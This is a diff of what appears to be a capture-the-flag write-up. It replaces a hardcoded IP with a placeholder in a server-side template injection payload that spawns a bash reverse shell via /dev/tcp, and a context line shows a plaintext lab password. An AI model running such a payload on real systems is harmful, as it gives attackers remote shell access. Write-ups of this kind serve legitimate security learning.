@@ -169,7 +169,7 @@ password = Saket!#$%@!!
 
 ```bash
 # change the IP to your machine IP
-{%import os%}{{os.system('bash -c "bash -i >& /dev/tcp/10.176.154.65/1337 0>&1"')}}
+{%import os%}{{os.system('bash -c "bash -i >& /dev/tcp/IP/1337 0>&1"')}}
 ```
 
 ![ssti-payload.png](./Images/ssti-payload.png)
